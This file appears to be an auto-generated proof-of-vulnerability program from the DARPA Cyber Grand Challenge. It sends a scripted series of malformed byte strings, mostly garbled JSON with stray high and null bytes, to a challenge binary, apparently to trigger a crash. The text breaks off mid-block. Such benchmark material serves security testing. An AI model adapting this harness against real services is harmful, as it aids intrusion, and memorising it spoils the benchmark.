#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** length read
      read_00000_len = 110;
      read_00000 = (unsigned char*)cgc_malloc(read_00000_len);
      int read_00000_res = cgc_length_read(0, read_00000, read_00000_len);
      if (read_00000_res) {} //silence unused variable warning
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x37\x37\x37\x0a";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** length read
      read_00001_len = 7;
      read_00001 = (unsigned char*)cgc_malloc(read_00001_len);
      int read_00001_res = cgc_length_read(0, read_00001, read_00001_len);
      if (read_00001_res) {} //silence unused variable warning
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x31\x31\x30\x0a";
      static unsigned int write_00001_00000_len = 4;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** length read
      read_00002_len = 25;
      read_00002 = (unsigned char*)cgc_malloc(read_00002_len);
      int read_00002_res = cgc_length_read(0, read_00002, read_00002_len);
      if (read_00002_res) {} //silence unused variable warning
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00002_00000[] = 
         "\x31\x0a\x74\x72\x75\x65\x00\xff\x37\x37\xfd\x32\x0a";
      static unsigned int write_00002_00000_len = 13;
      unsigned char *write_00002 = NULL;
      unsigned int write_00002_len = 0;
      write_00002 = cgc_append_buf(write_00002, &write_00002_len, write_00002_00000, write_00002_00000_len);
      if (write_00002_len > 0) {
         cgc_transmit_all(1, write_00002, write_00002_len);
      }
      cgc_free(write_00002);
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** length read
      read_00003_len = 25;
      read_00003 = (unsigned char*)cgc_malloc(read_00003_len);
      int read_00003_res = cgc_length_read(0, read_00003, read_00003_len);
      if (read_00003_res) {} //silence unused variable warning
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00003_00000[] = 
         "\x37\x37\x37\x0a";
      static unsigned int write_00003_00000_len = 4;
      unsigned char *write_00003 = NULL;
      unsigned int write_00003_len = 0;
      write_00003 = cgc_append_buf(write_00003, &write_00003_len, write_00003_00000, write_00003_00000_len);
      if (write_00003_len > 0) {
         cgc_transmit_all(1, write_00003, write_00003_len);
      }
      cgc_free(write_00003);
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** length read
      read_00004_len = 4;
      read_00004 = (unsigned char*)cgc_malloc(read_00004_len);
      int read_00004_res = cgc_length_read(0, read_00004, read_00004_len);
      if (read_00004_res) {} //silence unused variable warning
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00004_00000[] = 
         "\x32\x0a";
      static unsigned int write_00004_00000_len = 2;
      unsigned char *write_00004 = NULL;
      unsigned int write_00004_len = 0;
      write_00004 = cgc_append_buf(write_00004, &write_00004_len, write_00004_00000, write_00004_00000_len);
      if (write_00004_len > 0) {
         cgc_transmit_all(1, write_00004, write_00004_len);
      }
      cgc_free(write_00004);
   } while (0);
   do {
      unsigned char *read_00005;
      unsigned int read_00005_len;
      unsigned int read_00005_ptr = 0;
      //**** length read
      read_00005_len = 4;
      read_00005 = (unsigned char*)cgc_malloc(read_00005_len);
      int read_00005_res = cgc_length_read(0, read_00005, read_00005_len);
      if (read_00005_res) {} //silence unused variable warning
      cgc_free(read_00005);
      if (read_00005_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00005_00000[] = 
         "\x39\x38\x33\x0a";
      static unsigned int write_00005_00000_len = 4;
      unsigned char *write_00005 = NULL;
      unsigned int write_00005_len = 0;
      write_00005 = cgc_append_buf(write_00005, &write_00005_len, write_00005_00000, write_00005_00000_len);
      if (write_00005_len > 0) {
         cgc_transmit_all(1, write_00005, write_00005_len);
      }
      cgc_free(write_00005);
   } while (0);
   do {
      unsigned char *read_00006;
      unsigned int read_00006_len;
      unsigned int read_00006_ptr = 0;
      //**** length read
      read_00006_len = 25;
      read_00006 = (unsigned char*)cgc_malloc(read_00006_len);
      int read_00006_res = cgc_length_read(0, read_00006, read_00006_len);
      if (read_00006_res) {} //silence unused variable warning
      cgc_free(read_00006);
      if (read_00006_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00006_00000[] = 
         "\x32\x86\x86\x86\x86\x86\x86\x86\x86\x86\x86\x86\x86\x83\x86\x8a";
      static unsigned int write_00006_00000_len = 16;
      unsigned char *write_00006 = NULL;
      unsigned int write_00006_len = 0;
      write_00006 = cgc_append_buf(write_00006, &write_00006_len, write_00006_00000, write_00006_00000_len);
      if (write_00006_len > 0) {
         cgc_transmit_all(1, write_00006, write_00006_len);
      }
      cgc_free(write_00006);
   } while (0);
   do {
      unsigned char *read_00007;
      unsigned int read_00007_len;
      unsigned int read_00007_ptr = 0;
      //**** length read
      read_00007_len = 4;
      read_00007 = (unsigned char*)cgc_malloc(read_00007_len);
      int read_00007_res = cgc_length_read(0, read_00007, read_00007_len);
      if (read_00007_res) {} //silence unused variable warning
      cgc_free(read_00007);
      if (read_00007_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00007_00000[] = 
         "\x86\x75\x86\x0a";
      static unsigned int write_00007_00000_len = 4;
      unsigned char *write_00007 = NULL;
      unsigned int write_00007_len = 0;
      write_00007 = cgc_append_buf(write_00007, &write_00007_len, write_00007_00000, write_00007_00000_len);
      if (write_00007_len > 0) {
         cgc_transmit_all(1, write_00007, write_00007_len);
      }
      cgc_free(write_00007);
   } while (0);
   do {
      unsigned char *read_00008;
      unsigned int read_00008_len;
      unsigned int read_00008_ptr = 0;
      //**** length read
      read_00008_len = 25;
      read_00008 = (unsigned char*)cgc_malloc(read_00008_len);
      int read_00008_res = cgc_length_read(0, read_00008, read_00008_len);
      if (read_00008_res) {} //silence unused variable warning
      cgc_free(read_00008);
      if (read_00008_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00008_00000[] = 
         "\x31\x0a\x7b\x22\x61\x6f\x46\x4f\x43\x68\x65\x6f\x56\x5a\x62\x48"
         "\x4e\x62\x46\x67\x44\x4d\x67\x53\x59\x46\x74\x72\x50\x42\x48\x61"
         "\x71\x68\x80\x3a\x20\x22\x44\x22\x64\x45\x22\x3a\x20\x6e\x75\x6c"
         "\x6c\x2c\x20\x22\x49\x4a\x70\x4c\x4e\x4c\x76\x4b\x72\x72\x69\x43"
         "\x59\x6a\x52\x61\x45\x53\x4b\x43\x2c\x20\x22\x64\x45\x66\x70\x73"
         "\x42\x54\x66\x49\x75\x6d\x6c\x78\x4b\x68\x66\x52\x44\x44\x44\x61"
         "\x61\x57\x61\x66\x6b\x4f\x69\x65\x6a\x72\x47\x6b\x4c\x78\x6a\x68"
         "\x50\x7a\x57\x50\x59\x63\x47\x72\x6b\x75\x5a\x4c\x55\x66\x58\x4e"
         "\x7f\x4c\x73\x70\x22\x3a\x20\x2d\x30\x2e\x35\x35\x2c\x20\x22\x68"
         "\x41\x52\x22\x3a\x20\x74\x72\x75\x65\x2c\x20\x22\x6d\x4c\x74\x76"
         "\x65\x5a\x46\x49\x4d\x74\x58\x64\x6a\x75\x74\x62\x52\x46\x7a\x79"
         "\x4c\x4d\x7a\x59\x54\x79\x59\x64\x45\x22\x3a\x20\x6e\x75\x6c\x6c"
         "\x2c\x20\x22\x49\x4a\x70\x4c\x4e\x4c\x76\x4b\x72\x72\x69\x43\x59"
         "\x6a\x52\x61\x53\x53\x4b\x43\x6d\x77\x44\x66\x56\x7a\x48\x6c\x74"
         "\x43\x00";
      static unsigned int write_00008_00000_len = 226;
      unsigned char *write_00008 = NULL;
      unsigned int write_00008_len = 0;
      write_00008 = cgc_append_buf(write_00008, &write_00008_len, write_00008_00000, write_00008_00000_len);
      if (write_00008_len > 0) {
         cgc_transmit_all(1, write_00008, write_00008_len);
      }
      cgc_free(write_00008);
   } while (0);
   do {
      unsigned char *read_00009;
      unsigned int read_00009_len;
      unsigned int read_00009_ptr = 0;
      //**** length read
      read_00009_len = 7;
      read_00009 = (unsigned char*)cgc_malloc(read_00009_len);
      int read_00009_res = cgc_length_read(0, read_00009, read_00009_len);
      if (read_00009_res) {} //silence unused variable warning
      cgc_free(read_00009);
      if (read_00009_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00009_00000[] = 
         "\x01\x00\x00\x48\x57\x66\x62\x56\x75\x42\x43\x59\x46\x51\x4f\x74";
      static unsigned int write_00009_00000_len = 16;
      unsigned char *write_00009 = NULL;
      unsigned int write_00009_len = 0;
      write_00009 = cgc_append_buf(write_00009, &write_00009_len, write_00009_00000, write_00009_00000_len);
      if (write_00009_len > 0) {
         cgc_transmit_all(1, write_00009, write_00009_len);
      }
      cgc_free(write_00009);
   } while (0);
   do {
      unsigned char *read_00010;
      unsigned int read_00010_len;
      unsigned int read_00010_ptr = 0;
      //**** length read
      read_00010_len = 25;
      read_00010 = (unsigned char*)cgc_malloc(read_00010_len);
      int read_00010_res = cgc_length_read(0, read_00010, read_00010_len);
      if (read_00010_res) {} //silence unused variable warning
      cgc_free(read_00010);
      if (read_00010_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00010_00000[] = 
         "\x65\x71\x5a\x44\x22\x3a\x20\x22\x72\x22\x2c\x20\x22\x76\x22\x3a";
      static unsigned int write_00010_00000_len = 16;
      unsigned char *write_00010 = NULL;
      unsigned int write_00010_len = 0;
      write_00010 = cgc_append_buf(write_00010, &write_00010_len, write_00010_00000, write_00010_00000_len);
      if (write_00010_len > 0) {
         cgc_transmit_all(1, write_00010, write_00010_len);
      }
      cgc_free(write_00010);
   } while (0);
   do {
      unsigned char *read_00011;
      unsigned int read_00011_len;
      unsigned int read_00011_ptr = 0;
      //**** length read
      read_00011_len = 25;
      read_00011 = (unsigned char*)cgc_malloc(read_00011_len);
      int read_00011_res = cgc_length_read(0, read_00011, read_00011_len);
      if (read_00011_res) {} //silence unused variable warning
      cgc_free(read_00011);
      if (read_00011_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00011_00000[] = 
         "\x20\x2d\x30\x2e\x30\x39\x2c\x20\x22\x58\x66\x35\x73\x43\x44\x49";
      static unsigned int write_00011_00000_len = 16;
      unsigned char *write_00011 = NULL;
      unsigned int write_00011_len = 0;
      write_00011 = cgc_append_buf(write_00011, &write_00011_len, write_00011_00000, write_00011_00000_len);
      if (write_00011_len > 0) {
         cgc_transmit_all(1, write_00011, write_00011_len);
      }
      cgc_free(write_00011);
   } while (0);
   do {
      unsigned char *read_00012;
      unsigned int read_00012_len;
      unsigned int read_00012_ptr = 0;
      //**** length read
      read_00012_len = 25;
      read_00012 = (unsigned char*)cgc_malloc(read_00012_len);
      int read_00012_res = cgc_length_read(0, read_00012, read_00012_len);
      if (read_00012_res) {} //silence unused variable warning
      cgc_free(read_00012);
      if (read_00012_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00012_00000[] = 
         "\x44\x4b\x3e\x7a\x79\x70\x58\x57\x53\x68\x7a\x73\x61\x74\x56\x00";
      static unsigned int write_00012_00000_len = 16;
      unsigned char *write_00012 = NULL;
      unsigned int write_00012_len = 0;
      write_00012 = cgc_append_buf(write_00012, &write_00012_len, write_00012_00000, write_00012_00000_len);
      if (write_00012_len > 0) {
         cgc_transmit_all(1, write_00012, write_00012_len);
      }
      cgc_free(write_00012);
   } while (0);
   do {
      unsigned char *read_00013;
      unsigned int read_00013_len;
      unsigned int read_00013_ptr = 0;
      //**** length read
      read_00013_len = 25;
      read_00013 = (unsigned char*)cgc_malloc(read_00013_len);
      int read_00013_res = cgc_length_read(0, read_00013, read_00013_len);
      if (read_00013_res) {} //silence unused variable warning
      cgc_free(read_00013);
      if (read_00013_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00013_00000[] = 
         "\x00\x10\x00\x78\x51\x58\x56\x72\x6c\x6e\x54\x44\x71\x65\x4c\x76";
      static unsigned int write_00013_00000_len = 16;
      unsigned char *write_00013 = NULL;
      unsigned int write_00013_len = 0;
      write_00013 = cgc_append_buf(write_00013, &write_00013_len, write_00013_00000, write_00013_00000_len);
      if (write_00013_len > 0) {
         cgc_transmit_all(1, write_00013, write_00013_len);
      }
      cgc_free(write_00013);
   } while (0);
   do {
      unsigned char *read_00014;
      unsigned int read_00014_len;
      unsigned int read_00014_ptr = 0;
      //**** length read
      read_00014_len = 25;
      read_00014 = (unsigned char*)cgc_malloc(read_00014_len);
      int read_00014_res = cgc_length_read(0, read_00014, read_00014_len);
      if (read_00014_res) {} //silence unused variable warning
      cgc_free(read_00014);
      if (read_00014_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00014_00000[] = 
         "\x62\x67\x75\x49\x5c\x75\x67\x50\x70\x77\x70\x79\x43\x69\x62\x51";
      static unsigned int write_00014_00000_len = 16;
      unsigned char *write_00014 = NULL;
      unsigned int write_00014_len = 0;
      write_00014 = cgc_append_buf(write_00014, &write_00014_len, write_00014_00000, write_00014_00000_len);
      if (write_00014_len > 0) {
         cgc_transmit_all(1, write_00014, write_00014_len);
      }
      cgc_free(write_00014);
   } while (0);
   do {
      unsigned char *read_00015;
      unsigned int read_00015_len;
      unsigned int read_00015_ptr = 0;
      //**** length read
      read_00015_len = 25;
      read_00015 = (unsigned char*)cgc_malloc(read_00015_len);
      int read_00015_res = cgc_length_read(0, read_00015, read_00015_len);
      if (read_00015_res) {} //silence unused variable warning
      cgc_free(read_00015);
      if (read_00015_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00015_00000[] = 
         "\x41\x4c\x68\x50\x22\x3a\x20\x6e\x75\x6c\x6c\x2c\x20\x26\x62\x4d";
      static unsigned int write_00015_00000_len = 16;
      unsigned char *write_00015 = NULL;
      unsigned int write_00015_len = 0;
      write_00015 = cgc_append_buf(write_00015, &write_00015_len, write_00015_00000, write_00015_00000_len);
      if (write_00015_len > 0) {
         cgc_transmit_all(1, write_00015, write_00015_len);
      }
      cgc_free(write_00015);
   } while (0);
   do {
      unsigned char *read_00016;
      unsigned int read_00016_len;
      unsigned int read_00016_ptr = 0;
      //**** length read
      read_00016_len = 25;
      read_00016 = (unsigned char*)cgc_malloc(read_00016_len);
      int read_00016_res = cgc_length_read(0, read_00016, read_00016_len);
      if (read_00016_res) {} //silence unused variable warning
      cgc_free(read_00016);
      if (read_00016_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00016_00000[] = 
         "\x22\x3a\x20\x6e\x75\x6c\x6c\x2c\x20\x1e\x6d\x42\x62\x45\x6e\x6b";
      static unsigned int write_00016_00000_len = 16;
      unsigned char *write_00016 = NULL;
      unsigned int write_00016_len = 0;
      write_00016 = cgc_append_buf(write_00016, &write_00016_len, write_00016_00000, write_00016_00000_len);
      if (write_00016_len > 0) {
         cgc_transmit_all(1, write_00016, write_00016_len);
      }
      cgc_free(write_00016);
   } while (0);
   do {
      unsigned char *read_00017;
      unsigned int read_00017_len;
      unsigned int read_00017_ptr = 0;
      //**** length read
      read_00017_len = 25;
      read_00017 = (unsigned char*)cgc_malloc(read_00017_len);
      int read_00017_res = cgc_length_read(0, read_00017, read_00017_len);
      if (read_00017_res) {} //silence unused variable warning
      cgc_free(read_00017);
      if (read_00017_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00017_00000[] = 
         "\x5a\x54\x63\x5a\x6a\x65\x71\x58\x6e\x75\x4f\x71\x65\x79\x5a\x22";
      static unsigned int write_00017_00000_len = 16;
      unsigned char *write_00017 = NULL;
      unsigned int write_00017_len = 0;
      write_00017 = cgc_append_buf(write_00017, &write_00017_len, write_00017_00000, write_00017_00000_len);
      if (write_00017_len > 0) {
         cgc_transmit_all(1, write_00017, write_00017_len);
      }
      cgc_free(write_00017);
   } while (0);
   do {
      unsigned char *read_00018;
      unsigned int read_00018_len;
      unsigned int read_00018_ptr = 0;
      //**** length read
      read_00018_len = 25;
      read_00018 = (unsigned char*)cgc_malloc(read_00018_len);
      int read_00018_res = cgc_length_read(0, read_00018, read_00018_len);
      if (read_00018_res) {} //silence unused variable warning
      cgc_free(read_00018);
      if (read_00018_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00018_00000[] = 
         "\x3a\x20\x5b\x2d\x31\x37\x39\x36\x37\x30\x35\x38\x31\x37\x2c\x00";
      static unsigned int write_00018_00000_len = 16;
      unsigned char *write_00018 = NULL;
      unsigned int write_00018_len = 0;
      write_00018 = cgc_append_buf(write_00018, &write_00018_len, write_00018_00000, write_00018_00000_len);
      if (write_00018_len > 0) {
         cgc_transmit_all(1, write_00018, write_00018_len);
      }
      cgc_free(write_00018);
   } while (0);
   do {
      unsigned char *read_00019;
      unsigned int read_00019_len;
      unsigned int read_00019_ptr = 0;
      //**** length read
      read_00019_len = 25;
      read_00019 = (unsigned char*)cgc_malloc(read_00019_len);
      int read_00019_res = cgc_length_read(0, read_00019, read_00019_len);
      if (read_00019_res) {} //silence unused variable warning
      cgc_free(read_00019);
      if (read_00019_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00019_00000[] = 
         "\x40\x22\x58\x59\x45\x78\x50\x6b\x57\x47\x69\x54\x51\x5a\x7a\x58";
      static unsigned int write_00019_00000_len = 16;
      unsigned char *write_00019 = NULL;
      unsigned int write_00019_len = 0;
      write_00019 = cgc_append_buf(write_00019, &write_00019_len, write_00019_00000, write_00019_00000_len);
      if (write_00019_len > 0) {
         cgc_transmit_all(1, write_00019, write_00019_len);
      }
      cgc_free(write_00019);
   } while (0);
   do {
      unsigned char *read_00020;
      unsigned int read_00020_len;
      unsigned int read_00020_ptr = 0;
      //**** length read
      read_00020_len = 25;
      read_00020 = (unsigned char*)cgc_malloc(read_00020_len);
      int read_00020_res = cgc_length_read(0, read_00020, read_00020_len);
      if (read_00020_res) {} //silence unused variable warning
      cgc_free(read_00020);
      if (read_00020_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00020_00000[] = 
         "\x6c\x5a\x56\x4d\x6e\x6b\x4f\x78\x62\x4a\x49\x64\x54\x4a\x62\x66";
      static unsigned int write_00020_00000_len = 16;
      unsigned char *write_00020 = NULL;
      unsigned int write_00020_len = 0;
      write_00020 = cgc_append_buf(write_00020, &write_00020_len, write_00020_00000, write_00020_00000_len);
      if (write_00020_len > 0) {
         cgc_transmit_all(1, write_00020, write_00020_len);
      }
      cgc_free(write_00020);
   } while (0);
   do {
      unsigned char *read_00021;
      unsigned int read_00021_len;
      unsigned int read_00021_ptr = 0;
      //**** length read
      read_00021_len = 25;
      read_00021 = (unsigned char*)cgc_malloc(read_00021_len);
      int read_00021_res = cgc_length_read(0, read_00021, read_00021_len);
      if (read_00021_res) {} //silence unused variable warning
      cgc_free(read_00021);
      if (read_00021_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00021_00000[] = 
         "\x73\x45\x74\x54\x64\x45\x6f\x6f\x63\x4c\x58\x22\x3a\x20\x7b\x22";
      static unsigned int write_00021_00000_len = 16;
      unsigned char *write_00021 = NULL;
      unsigned int write_00021_len = 0;
      write_00021 = cgc_append_buf(write_00021, &write_00021_len, write_00021_00000, write_00021_00000_len);
      if (write_00021_len > 0) {
         cgc_transmit_all(1, write_00021, write_00021_len);
      }
      cgc_free(write_00021);
   } while (0);
   do {
      unsigned char *read_00022;
      unsigned int read_00022_len;
      unsigned int read_00022_ptr = 0;
      //**** length read
      read_00022_len = 25;
      read_00022 = (unsigned char*)cgc_malloc(read_00022_len);
      int read_00022_res = cgc_length_read(0, read_00022, read_00022_len);
      if (read_00022_res) {} //silence unused variable warning
      cgc_free(read_00022);
      if (read_00022_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00022_00000[] = 
         "\x45\x41\x61\x53\x49\x44\x49\x53\x59\x43\x4b\x57\x4a\x68\x46\x59";
      static unsigned int write_00022_00000_len = 16;
      unsigned char *write_00022 = NULL;
      unsigned int write_00022_len = 0;
      write_00022 = cgc_append_buf(write_00022, &write_00022_len, write_00022_00000, write_00022_00000_len);
      if (write_00022_len > 0) {
         cgc_transmit_all(1, write_00022, write_00022_len);
      }
      cgc_free(write_00022);
   } while (0);
   do {
      unsigned char *read_00023;
      unsigned int read_00023_len;
      unsigned int read_00023_ptr = 0;
      //**** length read
      read_00023_len = 25;
      read_00023 = (unsigned char*)cgc_malloc(read_00023_len);
      int read_00023_res = cgc_length_read(0, read_00023, read_00023_len);
      if (read_00023_res) {} //silence unused variable warning
      cgc_free(read_00023);
      if (read_00023_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00023_00000[] = 
         "\x79\x5a\x75\x4d\x5a\x76\x6c\x72\x69\x54\x52\x52\x70\x6b\x77\x75";
      static unsigned int write_00023_00000_len = 16;
      unsigned char *write_00023 = NULL;
      unsigned int write_00023_len = 0;
      write_00023 = cgc_append_buf(write_00023, &write_00023_len, write_00023_00000, write_00023_00000_len);
      if (write_00023_len > 0) {
         cgc_transmit_all(1, write_00023, write_00023_len);
      }
      cgc_free(write_00023);
   } while (0);
   do {
      unsigned char *read_00024;
      unsigned int read_00024_len;
      unsigned int read_00024_ptr = 0;
      //**** length read
      read_00024_len = 25;
      read_00024 = (unsigned char*)cgc_malloc(read_00024_len);
      int read_00024_res = cgc_length_read(0, read_00024, read_00024_len);
      if (read_00024_res) {} //silence unused variable warning
      cgc_free(read_00024);
      if (read_00024_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00024_00000[] = 
         "\x76\x69\x51\x49\x6d\x72\x4a\x6f\x70\x47\x74\x57\x6a\x4a\x58\x67";
      static unsigned int write_00024_00000_len = 16;
      unsigned char *write_00024 = NULL;
      unsigned int write_00024_len = 0;
      write_00024 = cgc_append_buf(write_00024, &write_00024_len, write_00024_00000, write_00024_00000_len);
      if (write_00024_len > 0) {
         cgc_transmit_all(1, write_00024, write_00024_len);
      }
      cgc_free(write_00024);
   } while (0);
   do {
      unsigned char *read_00025;
      unsigned int read_00025_len;
      unsigned int read_00025_ptr = 0;
      //**** length read
      read_00025_len = 25;
      read_00025 = (unsigned char*)cgc_malloc(read_00025_len);
      int read_00025_res = cgc_length_read(0, read_00025, read_00025_len);
      if (read_00025_res) {} //silence unused variable warning
      cgc_free(read_00025);
      if (read_00025_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00025_00000[] = 
         "\x62\x7a\x64\x68\x63\x77\x73\x5a\x65\x54\x45\x43\x58\x77\x4f\x6f";
      static unsigned int write_00025_00000_len = 16;
      unsigned char *write_00025 = NULL;
      unsigned int write_00025_len = 0;
      write_00025 = cgc_append_buf(write_00025, &write_00025_len, write_00025_00000, write_00025_00000_len);
      if (write_00025_len > 0) {
         cgc_transmit_all(1, write_00025, write_00025_len);
      }
      cgc_free(write_00025);
   } while (0);
   do {
      unsigned char *read_00026;
      unsigned int read_00026_len;
      unsigned int read_00026_ptr = 0;
      //**** length read
      read_00026_len = 25;
      read_00026 = (unsigned char*)cgc_malloc(read_00026_len);
      int read_00026_res = cgc_length_read(0, read_00026, read_00026_len);
      if (read_00026_res) {} //silence unused variable warning
      cgc_free(read_00026);
      if (read_00026_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00026_00000[] = 
         "\x77\x6c\x6b\x22\x3a\x20\x31\x35\x38\x38\x36\x39\x30\x35\x35\x38";
      static unsigned int write_00026_00000_len = 16;
      unsigned char *write_00026 = NULL;
      unsigned int write_00026_len = 0;
      write_00026 = cgc_append_buf(write_00026, &write_00026_len, write_00026_00000, write_00026_00000_len);
      if (write_00026_len > 0) {
         cgc_transmit_all(1, write_00026, write_00026_len);
      }
      cgc_free(write_00026);
   } while (0);
   do {
      unsigned char *read_00027;
      unsigned int read_00027_len;
      unsigned int read_00027_ptr = 0;
      //**** length read
      read_00027_len = 25;
      read_00027 = (unsigned char*)cgc_malloc(read_00027_len);
      int read_00027_res = cgc_length_read(0, read_00027, read_00027_len);
      if (read_00027_res) {} //silence unused variable warning
      cgc_free(read_00027);
      if (read_00027_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00027_00000[] = 
         "\x2c\x20\x22\x61\x4f\x48\x43\x44\x47\x7a\x00\x80\x79\x72\x70\x54";
      static unsigned int write_00027_00000_len = 16;
      unsigned char *write_00027 = NULL;
      unsigned int write_00027_len = 0;
      write_00027 = cgc_append_buf(write_00027, &write_00027_len, write_00027_00000, write_00027_00000_len);
      if (write_00027_len > 0) {
         cgc_transmit_all(1, write_00027, write_00027_len);
      }
      cgc_free(write_00027);
   } while (0);
   do {
      unsigned char *read_00028;
      unsigned int read_00028_len;
      unsigned int read_00028_ptr = 0;
      //**** length read
      read_00028_len = 25;
      read_00028 = (unsigned char*)cgc_malloc(read_00028_len);
      int read_00028_res = cgc_length_read(0, read_00028, read_00028_len);
      if (read_00028_res) {} //silence unused variable warning
      cgc_free(read_00028);
      if (read_00028_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00028_00000[] = 
         "\x71\x22\x3a\x20\x22\x51\x46\x70\x6d\x75\x77\x4b\x4a\x46\x46\x77";
      static unsigned int write_00028_00000_len = 16;
      unsigned char *write_00028 = NULL;
      unsigned int write_00028_len = 0;
      write_00028 = cgc_append_buf(write_00028, &write_00028_len, write_00028_00000, write_00028_00000_len);
      if (write_00028_len > 0) {
         cgc_transmit_all(1, write_00028, write_00028_len);
      }
      cgc_free(write_00028);
   } while (0);
   do {
      unsigned char *read_00029;
      unsigned int read_00029_len;
      unsigned int read_00029_ptr = 0;
      //**** length read
      read_00029_len = 25;
      read_00029 = (unsigned char*)cgc_malloc(read_00029_len);
      int read_00029_res = cgc_length_read(0, read_00029, read_00029_len);
      if (read_00029_res) {} //silence unused variable warning
      cgc_free(read_00029);
      if (read_00029_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00029_00000[] = 
         "\x59\x48\x62\x57\x4d\x58\x72\x77\x6e\x64\x4a\x6e\x54\x50\x4a\x61";
      static unsigned int write_00029_00000_len = 16;
      unsigned char *write_00029 = NULL;
      unsigned int write_00029_len = 0;
      write_00029 = cgc_append_buf(write_00029, &write_00029_len, write_00029_00000, write_00029_00000_len);
      if (write_00029_len > 0) {
         cgc_transmit_all(1, write_00029, write_00029_len);
      }
      cgc_free(write_00029);
   } while (0);
   do {
      unsigned char *read_00030;
      unsigned int read_00030_len;
      unsigned int read_00030_ptr = 0;
      //**** length read
      read_00030_len = 25;
      read_00030 = (unsigned char*)cgc_malloc(read_00030_len);
      int read_00030_res = cgc_length_read(0, read_00030, read_00030_len);
      if (read_00030_res) {} //silence unused variable warning
      cgc_free(read_00030);
      if (read_00030_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00030_00000[] = 
         "\x6c\x64\x4a\x48\x48\x6b\x4a\x56\x6f\x71\x6a\x59\x4e\x74\x75\x74";
      static unsigned int write_00030_00000_len = 16;
      unsigned char *write_00030 = NULL;
      unsigned int write_00030_len = 0;
      write_00030 = cgc_append_buf(write_00030, &write_00030_len, write_00030_00000, write_00030_00000_len);
      if (write_00030_len > 0) {
         cgc_transmit_all(1, write_00030, write_00030_len);
      }
      cgc_free(write_00030);
   } while (0);
   do {
      unsigned char *read_00031;
      unsigned int read_00031_len;
      unsigned int read_00031_ptr = 0;
      //**** length read
      read_00031_len = 25;
      read_00031 = (unsigned char*)cgc_malloc(read_00031_len);
      int read_00031_res = cgc_length_read(0, read_00031, read_00031_len);
      if (read_00031_res) {} //silence unused variable warning
      cgc_free(read_00031);
      if (read_00031_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00031_00000[] = 
         "\x52\x66\x6f\x69\x73\x4b\x57\x66\x71\x5a\x4f\x66\x6f\x49\x57\x69";
